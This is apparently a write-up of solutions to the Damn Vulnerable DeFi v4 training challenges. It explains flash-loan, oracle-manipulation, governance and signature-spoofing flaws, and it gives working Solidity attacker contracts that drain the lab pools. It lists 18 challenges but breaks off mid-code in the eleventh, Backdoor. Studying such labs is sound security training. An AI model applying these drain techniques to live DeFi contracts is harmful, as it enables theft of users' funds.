# damn vulnerable defi solutuions

Here I solve Damn Vulnerable DeFi v4 challenges: https://www.damnvulnerabledefi.xyz/

In the explanations below, I assume that you are familiar with contracts.

[1. Unstoppable](#1-unstoppable)      
[2. Naive Receiver](#2-naive-receiver)  
[3. Truster](#3-truster)    
[4. Side Entrance](#4-side-entrance)   
[5. The Rewarder](#5-the-rewarder)  
[6. Selfie](#6-selfie)     
[7. Compromised](#7-compromised)    
[8. Puppet](#8-puppet)  
[9. Puppet-V2](#9-puppet-v2)    
[10. Free Rider](#10-free-rider)    
[11. Backdoor](#11-backdoor)    
[12. Climber](#12-climber)  
[13. Wallet Mining](#13-wallet-mining)  
[14. Puppet V3](#14-puppet-v3)  
[15. ABI Smuggling](#15-abi-smuggling)  
[16. Shards](#16-shards)    
[17. Curvy Puppet](#17-curvy-puppet)    
[18. Withdrawal](#18-withdrawal)    

## 1. Unstoppable

### Challenge Overview

There's a tokenized vault with a million DVT tokens deposited. It’s offering flash loans for free, until the grace period ends.
To catch any bugs before going 100% permissionless, the developers decided to run a live beta in testnet. There's a monitoring contract to check liveness of the flashloan feature.
Starting with 10 DVT tokens in balance, show that it's possible to halt the vault. It must stop offering flash loans.

### Contracts

UnstoppableVault.sol - main logic      
UnstoppableMonitor.sol - monitoring if vault is functional      
      
### Vulnerability Analysis

The UnstoppableVault challenge presents a denial-of-service (DoS) vulnerability through accounting system manipulation. The vault implements an ERC4626-compliant tokenized vault offering flash loans, but it contains a strict invariant check that can be exploited to prevent all flash loan operations. 
The core vulnerability lies in the flash loan function's ERC4626 compliance check:

    function flashLoan(...) external returns (bool) {
        if (amount == 0) revert InvalidAmount(0);
        if (address(asset) != _token) revert UnsupportedCurrency();
        uint256 balanceBefore = totalAssets();
        if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();
        // ... rest of flash loan logic
    }

This implementation is vulnerable because it enforces a strict accounting invariant that can be easily broken: the vault's token balance must exactly match what the share accounting system expects. Since the contract can receive tokens directly through transfers, this invariant can be compromised without going through the proper deposit mechanism.   

### Attack Flow 

1. Send any number of DVT tokens to vault address to increase it's balance without affecting the accounting system  
2. The invariant check (convertToShares(totalSupply) != balanceBefore) now permanently fails with InvalidBalance() error, effectively disabling the 

### Solution

[Code](https://github.com/HamMnatsakanyan/damn-vulnerable-defi-solutions/blob/main/test/unstoppable/Unstoppable.t.sol)  

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_unstoppable() public checkSolvedByPlayer {
        token.transfer(address(vault), 1);
    }



## 2. Naive receiver

### Challenge Overview

There’s a pool with 1000 WETH in balance offering flash loans. It has a fixed fee of 1 WETH. The pool supports meta-transactions by integrating with a permissionless forwarder contract. 
A user deployed a sample contract with 10 WETH in balance. Looks like it can execute flash loans of WETH.
All funds are at risk! Rescue all WETH from the user and the pool, and deposit it into the designated recovery account.

### Contracts:

NaiveRecevierPool.sol - The main pool that enables flash loans  
FlashLoanReceiver.sol - The victim borrower contract that will be drained      
BasicForwarder.sol - Enables meta-transactions through an EIP-712 system      
Multicall.sol - Allows batching multiple function calls into one transaction

### Vulnerability Analysis

So, we need to drain 1010 WETH from the pool and borrower contract. In NaiveReceiver.sol, we have the flashLoan function, which implements the core loan functionality. It calls the borrower's onFlashLoan() function, and here, we have our first critical security problem.

    function onFlashLoan(address, address token, uint256 amount, uint256 fee, bytes calldata)
        external
        returns (bytes32)
    {
        assembly {
            // gas savings
            if iszero(eq(sload(pool.slot), caller())) {
                mstore(0x00, 0x48f5c3ed)
                revert(0x1c, 0x04)
            }
        }

        if (token != address(NaiveReceiverPool(pool).weth())) revert NaiveReceiverPool.UnsupportedCurrency();

        uint256 amountToBeRepaid;
        unchecked {
            amountToBeRepaid = amount + fee;
        }

        _executeActionDuringFlashLoan();

        // Return funds to pool
        WETH(payable(token)).approve(pool, amountToBeRepaid);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

The onFlashLoan() function only checks if the caller is the pool, but it doesn't check if the transaction initiator is the actual owner of the contract. This means that anyone can call the transaction on the owner's behalf, and here is the solution to the first part of our challenge. As the fee of the loan is 1 ETH, we can drain the borrower's balance by simply calling the loan function 10 times on the owner's behalf. Now, all 1010 ETH are on the contract's balance and belong to the pool deployer.
We also need to drain the pool's balance. If we look closer to withdraw function, we'll see that the function does not check if the receiver is the initiator of the withdrawal. 

    function withdraw(uint256 amount, address payable receiver) external {
        // Reduce deposits
        deposits[_msgSender()] -= amount;
        totalDeposits -= amount;

        // Transfer ETH to designated receiver
        weth.transfer(receiver, amount);
    }

So we can put our address as the receiver. But there is a problem here. We, as msg.sender, don't have any balance in the pool's accounting. If we look closer at how _msgSender() function retrieves the initiator's address, we'll find the second security problem!

    function _msgSender() internal view override returns (address) {
        if (msg.sender == trustedForwarder && msg.data.length >= 20) {
            return address(bytes20(msg.data[msg.data.length - 20:]));
        } else {
            return super._msgSender();
        }
    }

Here, if _msgSender() got the request from trustedForwarder and it has msg.data appended to it, it will return the address appended to the request. So here, we can simply initiate a withdrawal request through Forwarder and append the deployer's address to it. The withdraw function will receive the deployer's address and will transfer all the funds to the specified receiver!

### Solution

[Code](https://github.com/HamMnatsakanyan/damn-vulnerable-defi-solutions/blob/main/test/naive-receiver/NaiveReceiver.t.sol#L79)

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_naiveReceiver() public checkSolvedByPlayer {

        uint8 numberOfCalls = 11;

        // Create an array of encoded flashLoan calls
        bytes[] memory encodedCalls = new bytes[](numberOfCalls);

        for(uint8 i = 0; i < 10; i++) {
            // Encode the call to flashLoan
            encodedCalls[i] = abi.encodeWithSignature(
                "flashLoan(address,address,uint256,bytes)",
                address(receiver),
                address(weth),
                0,
                ""
            );
        }

        // Encode the call to withdraw
        encodedCalls[10] = abi.encodePacked(abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_RECEIVER + WETH_IN_POOL, payable(recovery))), 
            bytes32(uint256(uint160(deployer)))
        );

        // Encode the multicall data
        bytes memory multicallData = abi.encodeCall(pool.multicall, encodedCalls);

        // Create the request
        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: player,
            target: address(pool),
            value: 0,
            gas: gasleft(),
            nonce: forwarder.nonces(player),
            data: multicallData,
            deadline: 1 days
        });

        // Hash the request
        bytes32 requestHash = keccak256(abi.encodePacked(
            "\x19\x01",
            forwarder.domainSeparator(),
            forwarder.getDataHash(request)
            )
        );

        // Sign the request
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        // Execute the transaction
        forwarder.execute(request, signature);
    }


## 3. Truster

### Challenge Overview 

More and more lending pools are offering flashloans. In this case, a new pool has launched that is offering flashloans of DVT tokens for free.
The pool holds 1 million DVT tokens. You have nothing.
To pass this challenge, rescue all funds in the pool executing a single transaction. Deposit the funds into the designated recovery account.

### Contracts

TrusterLenderPool.sol

### Vulnerability Analysis

The pool's core functionality is implemented in the flashLoan function. At the end of the function, it checks if the funds are fully refunded, so we need to find a way to get the DVT tokens after the function execution. 
If we look closer, we can see that the contract lets us make an arbitrary function call.

    target.functionCall(data);

This means that we can call any function we want from the flashLoan function. So if we make the pool contract to approve the DVT tokens for us, later we can transfer them to our recovery address. 

### Attack Flow

1. Call flashLoan() with a zero amount (no actual borrowing needed)
2. For data, encode an approve() call that gives us permission to transfer all the pool's tokens
3. The pool itself will execute this approval on our behalf
4. The balance check passes since we didn't take any tokens yet
5. After the flashLoan completes, use transferFrom() to move all tokens from the pool to our address

### Solution

    contract Drainer {
        constructor(DamnValuableToken token, TrusterLenderPool pool, address recovery) {
            bytes memory data = abi.encodeWithSignature(
                "approve(address,uint256)",
                address(this),
                token.balanceOf(address(pool))
            );

            pool.flashLoan(0, address(this), address(token), data);

            token.transferFrom(address(pool), recovery, token.balanceOf(address(pool)));
        }
    }

    /**
    * CODE YOUR SOLUTION HERE
    */
    function test_truster() public checkSolvedByPlayer {
        Drainer drainer = new Drainer(token, pool, recovery);
    }


## 4. Side entrance

### Challenge Overview

A surprisingly simple pool allows anyone to deposit ETH, and withdraw it at any point in time.
It has 1000 ETH in balance already, and is offering free flashloans using the deposited ETH to promote their system.
You start with 1 ETH in balance. Pass the challenge by rescuing all ETH from the pool and depositing it in the designated recovery account.

### Vulnerability Analysis

In the flashLoan() function, we can see that we have an opportunity to call our implementation of the execute() function. 
The function checks if we refund the ETH to the contract, but it doesn't control the way we do that. 

The root issue is that the contract doesn't distinguish between "repayment of a loan" and "making a deposit" - they both increase the contract's ETH balance, but have very different accounting implications. 

Attack flow:
1. Call flashLoan() to borrow all ETH from the pool
2. In our execute() function, deposit the borrowed ETH back into the pool
3. The pool's balance is restored (passing the check), but now we have credit in the pool's accounting system
4. Call withdraw() to drain the pool of all funds

This attack allows us to drain all ETH from the pool without actually owning any legitimate stake in it.

### Solution

    contract MyIFlashLoanEtherReceiver {
        SideEntranceLenderPool pool;
        address payable recovery;
        
        constructor(address _pool, address payable _recovery) {
            recovery = _recovery;
            pool = SideEntranceLenderPool(_pool);
        }

        function callFlashLoan(uint256 amount) external {
            pool.flashLoan(amount);
        }

        function execute() external payable {
            pool.deposit{value: msg.value}();
        }

        function withdraw() public {
            pool.withdraw();
            (bool success, ) = recovery.call{value: address(this).balance}("");
        }

        receive() external payable {}

    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_sideEntrance() public checkSolvedByPlayer {
        MyIFlashLoanEtherReceiver loanReceiver = new MyIFlashLoanEtherReceiver(address(pool), payable(recovery));
        loanReceiver.callFlashLoan(ETHER_IN_POOL);
        loanReceiver.withdraw();
    }

## 5. The rewarder

### Challenge Overview

A contract is distributing rewards of Damn Valuable Tokens and WETH.    
To claim rewards, users must prove they're included in the chosen set of beneficiaries. Don't worry about gas though. The contract has been optimized and allows claiming multiple tokens in the same transaction.  
Alice has claimed her rewards already. You can claim yours too! But you've realized there's a critical vulnerability in the contract.   
Save as much funds as you can from the distributor. Transfer all recovered assets to the designated recovery account.

### Vulnerability Analysis

The only way to get the funds is the claimRewards() function, so let's focus on that. The function allows us to claim both DVT and WETH rewards with one request. 
The first vulnerability we can notice is that the function marks our reward claimed in two cases:
    1. During the last iteration
    2. When the token to claim changes

Also, there's no limit on how many claims we can process in a single transaction. This creates an exploit path where we can submit multiple identical claims (using the same valid Merkle proof since 'player' is a legitimate beneficiary) for the same token and batch. Since the contract only marks claims as claimed at token switches or at the end of processing, we can claim our reward multiple times and drain the contract.

Attack flow:
1. Read the distribution JSON files to find our legitimate claim amount for DVT and WETH tokens
2. Create an array of multiple claims for the same token and same batch (batch 0)
3. For each token:
   - Make the first claim with a valid Merkle proof (since our address is on the beneficiary list)
   - Make multiple subsequent claims with the same Merkle proof
   - The contract will verify the proof for each claim, but only mark the batch as claimed after processing all claims
4. Execute the transaction to drain nearly all tokens from the distributor 
5. Transfer all recovered assets to the designated recovery account

### Solution

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_theRewarder() public checkSolvedByPlayer {
        
        string memory dvtDistributuion = vm.readFile("test/the-rewarder/dvt-distribution.json");
        Reward[] memory dvtRewards = abi.decode(vm.parseJson(dvtDistributuion), (Reward[]));

        string memory wethDistribution = vm.readFile("test/the-rewarder/weth-distribution.json");
        Reward[] memory wethRewards = abi.decode(vm.parseJson(wethDistribution), (Reward[]));

        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
    
        uint256 dvtAmount;
        bytes32[] memory dvtProof;
        for (uint256 i = 0; i < dvtRewards.length; i++) {
            if (dvtRewards[i].beneficiary == player) {
                dvtAmount = dvtRewards[i].amount;
                dvtProof = merkle.getProof(dvtLeaves, i);
                break;
            }
        }

        uint256 wethAmount;
        bytes32[] memory wethProof;
        for (uint256 i = 0; i < wethRewards.length; i++) {
            if (wethRewards[i].beneficiary == player) {
                wethAmount = wethRewards[i].amount;
                wethProof = merkle.getProof(wethLeaves, i);
                break;
            }
        }

        uint256 dvtClaimsNeeded = TOTAL_DVT_DISTRIBUTION_AMOUNT / dvtAmount;
        uint256 wethClaimsNeeded = TOTAL_WETH_DISTRIBUTION_AMOUNT / wethAmount;
        uint256 totalClaimsNeeded = dvtClaimsNeeded + wethClaimsNeeded;

        Claim[] memory claims = new Claim[](totalClaimsNeeded);
        for(uint256 i = 0; i < totalClaimsNeeded; i++) {
            if (i < dvtClaimsNeeded) {
                claims[i] = Claim({
                    batchNumber: 0,
                    amount: dvtAmount,
                    tokenIndex: 0,
                    proof: dvtProof
                });
            } else {
                claims[i] = Claim({
                    batchNumber: 0,
                    amount: wethAmount,
                    tokenIndex: 1,
                    proof: wethProof
                });
            }
        }

        IERC20[] memory tokens = new IERC20[](2);
        tokens[0] = IERC20(address(dvt));
        tokens[1] = IERC20(address(weth));

        distributor.claimRewards(claims, tokens);

        dvt.transfer(recovery, dvt.balanceOf(player));
        weth.transfer(recovery, weth.balanceOf(player));
    }


## 6. Selfie

### Challenge Overview

A new lending pool has launched! It’s now offering flash loans of DVT tokens. It even includes a fancy governance mechanism to control it.  
What could go wrong, right ?    
You start with no DVT tokens in balance, and the pool has 1.5 million at risk.  
Rescue all funds from the pool and deposit them into the designated recovery account.

### Vulnerability Analysis

The first vulnerability we can see is that the contract lets us take all of its tokens as a loan. The second fundamental issue is that the governance mechanism doesn't differentiate between token holders and accounts that only momentarily hold tokens (like during a flash loan). This creates a critical vulnerability where temporary capital can be used to influence governance decisions with permanent consequences.

Attack flow:

1. Take a flash loan of the majority of DVT tokens
2. Use these temporarily held tokens to self-delegate voting power
3. Queue a governance proposal to call emergencyExit() with a destination address they control
4. Return the flash-loaned tokens
5. Execute the queued action to drain the pool

### Solution

    contract Drainer is IERC3156FlashBorrower {
        SelfiePool pool;
        SimpleGovernance governance;
        DamnValuableVotes token;
        address recovery;
        uint256 actionId;
        bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

        constructor(address _pool, address _governance, address _token, address _recovery) {
            pool = SelfiePool(_pool);
            governance = SimpleGovernance(_governance);
            token = DamnValuableVotes(_token);
            recovery = _recovery;
        }

        function startAttack() external {
            uint256 amount = SelfiePool(pool).maxFlashLoan(address(token));
            SelfiePool(pool).flashLoan(this, address(token), amount, "");
        }

        function onFlashLoan(
            address sender,
            address _token,
            uint256 amount,
            uint256 fee,
            bytes calldata data
        ) external returns (bytes32) {

            require(msg.sender == address(pool), "Pool is not sender");
            require(sender == address(this), "Sender is not the owner");

            token.delegate(address(this));

            bytes memory payload = abi.encodeWithSignature("emergencyExit(address)", recovery);
            actionId = governance.queueAction(address(pool), 0, payload);

            token.approve(address(pool), amount);
            return CALLBACK_SUCCESS;
        }

        function executeProposal() external {
            governance.executeAction(actionId);
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_selfie() public checkSolvedByPlayer {
        Drainer drainer = new Drainer(address(pool), address(governance), address(token), recovery);
        drainer.startAttack();
        vm.warp(block.timestamp + 2 days);
        drainer.executeProposal();
    }


## 7. Compromised

### Challenge Overview

While poking around a web service of one of the most popular DeFi projects in the space, you get a strange response from the server. Here’s a snippet:  

```
HTTP/2 200 OK   
content-type: text/html 
content-language: en    
vary: Accept-Encoding   
server: cloudflare  

4d 48 67 33 5a 44 45 31 59 6d 4a 68 4d 6a 5a 6a 4e 54 49 7a 4e 6a 67 7a 59 6d 5a 6a 4d 32 52 6a 4e 32 4e 6b 59 7a 56 6b 4d 57 49 34 59 54 49 33 4e 44 51 30 4e 44 63 31 4f 54 64 6a 5a 6a 52 6b 59 54 45 33 4d 44 56 6a 5a 6a 5a 6a 4f 54 6b 7a 4d 44 59 7a 4e 7a 51 30 

4d 48 67 32 4f 47 4a 6b 4d 44 49 77 59 57 51 78 4f 44 5a 69 4e 6a 51 33 59 54 59 35 4d 57 4d 32 59 54 56 6a 4d 47 4d 78 4e 54 49 35 5a 6a 49 78 5a 57 4e 6b 4d 44 6c 6b 59 32 4d 30 4e 54 49 30 4d 54 51 77 4d 6d 46 6a 4e 6a 42 69 59 54 4d 33 4e 32 4d 30 4d 54 55 35 
``` 

A related on-chain exchange is selling (absurdly overpriced) collectibles called “DVNFT”, now at 999 ETH each.  
This price is fetched from an on-chain oracle, based on 3 trusted reporters: `0x188...088`, `0xA41...9D8` and `0xab3...a40`.    
Starting with just 0.1 ETH in balance, pass the challenge by rescuing all ETH available in the exchange. Then deposit the funds into the designated recovery account.

### Vulnerability Analysis

The challenge presents a strange server response from a popular DeFi project. While the `content-type` header indicates `text/html`, the actual content is hexadecimal data - a clear sign of a potential data leak.
The data leak can be something critical. Converting the hex data to ASCII revealed base64-encoded strings. Decoding these base64 strings reveled a string very similar Ethereum private key. Using the Foundry cast command `cast wallet address --private-key $PRIVATE_KEY`, we confirmed that the decoded strings were indeed private keys corresponding to two of the three trusted oracle reporters. This means that we can manipulate the NFT price.   

Attack flow:

1. Extract private keys from leaked data    
2. Manipulate the price downward    
3. Buy NFT at the manipulated price 
4. Reset oracle price   
5. Sell NFT at the inflated price   

### Solution

   /**
     * CODE YOUR SOLUTION HERE
     */
    function test_compromised() public checkSolved {
        
        uint256 privateKey1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
        uint256 privateKey2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;

        address source1 = vm.addr(privateKey1);
        address source2 = vm.addr(privateKey2);

        vm.startPrank(source1);
        oracle.postPrice("DVNFT", 0);
        vm.stopPrank();

        vm.startPrank(source2);
        oracle.postPrice("DVNFT", 0);
        vm.stopPrank();

        uint256 price = oracle.getMedianPrice("DVNFT");

        vm.startPrank(player);
        uint256 id = exchange.buyOne{value: 1 wei}();
        vm.stopPrank();

        vm.startPrank(source1);
        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
        vm.stopPrank();

        vm.startPrank(source2);
        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
        vm.stopPrank();

        vm.startPrank(player);
        nft.approve(address(exchange), id);
        exchange.sellOne(id);
        payable(recovery).transfer(EXCHANGE_INITIAL_ETH_BALANCE);
        vm.stopPrank();

    }


## 8. Puppet    

### Challenge Overview  

There’s a lending pool where users can borrow Damn Valuable Tokens (DVTs). To do so, they first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.  
There’s a DVT market opened in an old Uniswap v1 exchange, currently with 10 ETH and 10 DVT in liquidity.   
Pass the challenge by saving all tokens from the lending pool, then depositing them into the designated recovery account. You start with 25 ETH and 1000 DVTs in balance.   

### Vulnerability Analysis

The Puppet challenge presents a classic price oracle manipulation vulnerability in a DeFi lending protocol. The lending pool uses a Uniswap V1 exchange as its price oracle without any safeguards against manipulation.
The core vulnerability lies in the price oracle implementation within the PuppetPool contract. The _computeOraclePrice() function directly calculates the DVT/ETH price based on the current balances in the Uniswap pool:

    function _computeOraclePrice() private view returns (uint256) {
        // calculates the price of the token in wei according to Uniswap pair
        return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
    }

This implementation is highly vulnerable because it relies on a single liquidity source with extremely low liquidity and the price can be easily manipulated by changing the token balances in the pool.

Attack flow:    

1. Approve the Uniswap exchange to spend our DVT tokens 
2. Sell a large amount of our DVT tokens to the Uniswap exchange    
3. The price oracle now calculates a much lower price for DVT (because there's much more DVT in the pool)   
4. Calculate the new, manipulated collateral requirement    
5. Borrow all 100,000 DVT tokens from the lending pool using the minimal collateral requirement 
6. Send the borrowed tokens directly to the recovery address    

### Solution

    contract Attacker {

        DamnValuableToken token;
        PuppetPool pool;
        IUniswapV1Exchange exchange;
        address recovery;
        uint256 constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;
        
        constructor(DamnValuableToken _token, PuppetPool _pool, IUniswapV1Exchange _exchange, address _recovery) payable {
            token = _token;
            pool = _pool;
            exchange = _exchange;
            recovery = _recovery;
        }

        function startAttack() public {
            token.approve(address(exchange), 1000e18);
            exchange.tokenToEthSwapInput(1000e18, 1e18, block.timestamp + 1 days);
            uint256 collateralRequired = pool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
            pool.borrow{value: collateralRequired}(POOL_INITIAL_TOKEN_BALANCE, recovery);
        }

        receive() external payable{}
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_puppet() public checkSolvedByPlayer {
        Attacker attacker = new Attacker{value: 25e18}(token, lendingPool, uniswapV1Exchange, recovery);
        token.transfer(address(attacker), PLAYER_INITIAL_TOKEN_BALANCE);
        attacker.startAttack();
    }


## 9. Puppet V2    

### Challenge Overview  

The developers of the [previous pool](https://damnvulnerabledefi.xyz/challenges/puppet/) seem to have learned the lesson. And released a new version.   
Now they’re using a Uniswap v2 exchange as a price oracle, along with the recommended utility libraries. Shouldn't that be enough?  
You start with 20 ETH and 10000 DVT tokens in balance. The pool has a million DVT tokens in balance at risk!    
Save all funds from the pool, depositing them into the designated recovery account. 


### Vulnerability Analysis  

The Puppet V2 challenge exposes a persistent price oracle manipulation vulnerability despite upgrading from Uniswap V1 to V2. The lending pool now uses Uniswap V2 and wrapped ETH (WETH) as collateral, but the fundamental flaw remains.  
The core vulnerability lies in the _getOracleQuote() function within the PuppetV2Pool contract:

    function _getOracleQuote(uint256 amount) private view returns (uint256) {
        (uint256 reservesWETH, uint256 reservesToken) =
            UniswapV2Library.getReserves({factory: _uniswapFactory, tokenA: address(_weth), tokenB: address(_token)});

        return UniswapV2Library.quote({amountA: amount * 10 ** 18, reserveA: reservesToken, reserveB: reservesWETH});
    }   

This implementation is vulnerable because it still relies on the instantaneous state of a single liquidity pool and the oracle still uses current reserves to calculate the price. This means that the price can be manipulated by executing a large swap that significantly alters the reserves ratio. 

Attack flow:    

1. Convert ETH to WETH since the pool now uses WETH instead of native ETH   
2. Swap a large amount of DVT tokens for WETH through Uniswap V2    
3. The manipulated ratio makes DVT appear much less valuable relative to WETH   
4. Calculate the now greatly reduced collateral requirement 
5. Approve and deposit the minimal required WETH as collateral  
6. Borrow the entire DVT balance from the lending pool  
7. Transfer all tokens to the recovery address  

### Solution    

    contract Attacker is Test{
        WETH weth;
        DamnValuableToken token;
        IUniswapV2Router02 uniswapV2Router;
        PuppetV2Pool lendingPool;
        address recovery;
        uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 10_000e18;
        uint256 constant POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;

        constructor(
            address payable _weth,
            address _token,
            address _uniswapV2Router,
            address _lendingPool,
            address _recovery
        ) payable {
            weth = WETH(_weth);
            token = DamnValuableToken(_token);
            uniswapV2Router = IUniswapV2Router02(_uniswapV2Router);
            lendingPool = PuppetV2Pool(_lendingPool);
            recovery = _recovery;
        }

        function startAttack() external {
            weth.deposit{value: address(this).balance}();
            token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);

            address[] memory path = new address[](2);
            path[0] = address(token);
            path[1] = address(weth);
            uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                PLAYER_INITIAL_TOKEN_BALANCE,
                9e18,
                path,
                address(this),
                block.timestamp
            );

            uint256 amount = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
            weth.approve(address(lendingPool), amount);
            lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
            token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
        }

        function recieve() external payable {}
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_puppetV2() public checkSolvedByPlayer {
        Attacker attacker = new Attacker{value: 20e18}(
            payable(address(weth)),
            address(token),
            address(uniswapV2Router),
            address(lendingPool),
            recovery
        );
        token.transfer(address(attacker), PLAYER_INITIAL_TOKEN_BALANCE);

        attacker.startAttack();
    }


## 10. Free Rider   

### Challenge Overview  

A new marketplace of Damn Valuable NFTs has been released! There’s been an initial mint of 6 NFTs, which are available for sale in the marketplace. Each one at 15 ETH. 
A critical vulnerability has been reported, claiming that all tokens can be taken. Yet the developers don't know how to save them!  
They’re offering a bounty of 45 ETH for whoever is willing to take the NFTs out and send them their way. The recovery process is managed by a dedicated smart contract. 
You’ve agreed to help. Although, you only have 0.1 ETH in balance. The devs just won’t reply to your messages asking for more.  
If only you could get free ETH, at least for an instant.    


### Vulnerability Analysis  

The Free Rider challenge exposes a critical flaw in the payment logic of the NFT marketplace contract. The marketplace contains a logical error in the order of operations during NFT purchases.    
The core vulnerability lies in the _buyOne() function within the FreeRiderNFTMarketplace contract:  

    function _buyOne(uint256 tokenId) private {
        uint256 priceToPay = offers[tokenId];
        // ... checks for valid offer and sufficient payment ...
        
        --offersCount;

        // transfer from seller to buyer
        DamnValuableNFT _token = token;
        _token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId);

        // pay seller using cached token
        payable(_token.ownerOf(tokenId)).sendValue(priceToPay);

        emit NFTBought(msg.sender, tokenId, priceToPay);
    }

This implementation is vulnerable because it transfers the NFT to the buyer before paying the seller. The critical issue is that it calls _token.ownerOf(tokenId) after the NFT has already been transferred, which returns the buyer's address rather than the original seller. This means the buyer receives both the NFT and a refund of their payment, essentially allowing NFTs to be purchased for free.  

Attack flow:

1. Obtain temporary ETH through a Uniswap V2 flash swap to cover the initial purchase price 
2. Convert the borrowed WETH to ETH to make it compatible with the marketplace  
3. Purchase all 6 NFTs from the marketplace using the buyMany() function    
4. Due to the vulnerability, receive both the NFTs and all of the ETH back  
5. Transfer all 6 NFTs to the recovery manager contract with encoded data pointing to the attacker's address    
6. Receive the 45 ETH bounty from the recovery manager  
7. Convert enough ETH back to WETH to repay the flash loan with the 0.3% Uniswap V2 specific fee    

### Solution    

    contract Attacker is IERC721Receiver{
        WETH weth;
        IUniswapV2Pair uniswapPair;
        FreeRiderNFTMarketplace marketplace;
        FreeRiderRecoveryManager recoveryManager;
        DamnValuableNFT nft;
        address player;
        uint256 constant NFT_PRICE = 15 ether;

        constructor(
            WETH _weth,
            IUniswapV2Pair _uniswapPair,
            FreeRiderNFTMarketplace _marketplace,
            FreeRiderRecoveryManager _recoveryManager,
            DamnValuableNFT _nft,
            address _player
        ) {
            weth = _weth;
            uniswapPair = _uniswapPair;
            marketplace = _marketplace;
            recoveryManager = _recoveryManager;
            nft = _nft;
            player = _player;
        }

        function startAttack() public {
            bytes memory data = abi.encode(address(recoveryManager));
            uniswapPair.swap(NFT_PRICE, 0, address(this), data);
        }

        function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
            uint256[] memory tokenIds = new uint256[](6);
            for(uint256 i = 0; i < 6; i++) {
                tokenIds[i] = i;
            }
            
            weth.withdraw(NFT_PRICE);
            marketplace.buyMany{value: NFT_PRICE}(tokenIds);
            for(uint256 i = 0; i < 6; i++) {
                nft.safeTransferFrom(address(this), address(recoveryManager), i, abi.encode(player));
            }

            uint256 fee = (NFT_PRICE * 3) / 997 + 1;
            weth.deposit{value: 15e18 + fee}();
            weth.transfer(msg.sender, 15e18 + fee);
        }

        function onERC721Received(
            address operator,
            address from,
            uint256 tokenId,
            bytes calldata data
        ) external override returns (bytes4) {

            return this.onERC721Received.selector;
        }

        receive() external payable {}
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_freeRider() public checkSolvedByPlayer {
        Attacker attacker = new Attacker(
            weth,
            uniswapPair,
            marketplace,
            recoveryManager,
            nft,
            player
        );
        attacker.startAttack();
    }


## 11. Backdoor

### Challenge Overview

To incentivize the creation of more secure wallets in their team, someone has deployed a registry of Safe wallets. When someone in the team deploys and registers a wallet, they earn 10 DVT tokens.    
The registry tightly integrates with the legitimate Safe Proxy Factory. It includes strict safety checks.   
Currently there are four people registered as beneficiaries: Alice, Bob, Charlie and David. The registry has 40 DVT tokens in balance to be distributed among them. 
Uncover the vulnerability in the registry, rescue all funds, and deposit them into the designated recovery account. In a single transaction.    

### Vulnerability Analysis

The Backdoor challenge exposes a vulnerability in the integration between the WalletRegistry and Safe wallet initialization process. The registry implements rewards for beneficiaries who deploy wallets but fails to properly validate all aspects of wallet creation.    
The core vulnerability lies in the setup function of the Safe contract that allows for delegate calls during initialization. The WalletRegistry only validates certain parameters of the Safe wallet during the proxyCreated callback:  

    // Checks owner count
    address[] memory owners = Safe(walletAddress).getOwners();
    if (owners.length != EXPECTED_OWNERS_COUNT) {
        revert InvalidOwnersCount(owners.length);
    }

    // Checks the owner is a beneficiary
    address walletOwner = owners[0];
    if (!beneficiaries[walletOwner]) {
        revert OwnerIsNotABeneficiary();
    }

    // Checks fallback manager
    address fallbackManager = _getFallbackManager(walletAddress);
    if (fallbackManager != address(0)) {
        revert InvalidFallbackManager(fallbackManager);
    }   

The registry does not inspect or restrict the delegate call parameters (to and data) that are passed during wallet initialization. This oversight allows an attacker to include a malicious delegate call that executes with the context and permissions of the newly created wallet.    

Attack flow:

1. Deploy a malicious contract with a function that approves token transfers
2. For each beneficiary in the registry, create a Safe wallet with:
    - The beneficiary as the wallet owner (to pass registry checks)
    - A delegate call to the malicious contract during initialization
3. The delegate call executes in the context of the new wallet, approving the attacker to spend its tokens
4. When the registry transfers 10 DVT to each new wallet as a reward, immediately transfer those tokens to the attacker
5. After collecting tokens from all four beneficiaries, transfer the total 40 DVT to the recovery address

### Solution

    contract Attacker {
        Safe singletonCopy;
        SafeProxyFactory walletFactory;
        DamnValuableToken token;
        WalletRegistry walletRegistry;
        address[] beneficiaries;
        address recovery;
        uint immutable AMOUNT_TOKENS_DISTRIBUTED;

        constructor(
            Safe _singletonCopy,
            SafeProxyFactory _walletFactory,
            DamnValuableToken _token,
            WalletRegistry walletRegistryAddress,
            address[] memory _beneficiaries,
